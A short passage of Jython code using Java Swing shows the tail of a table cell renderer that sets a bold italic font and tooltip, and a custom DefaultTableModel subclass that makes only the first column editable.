            cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC));
            cell.setToolTipText(toolTipMessage)
        
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings) :
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col) :
        return col == 0
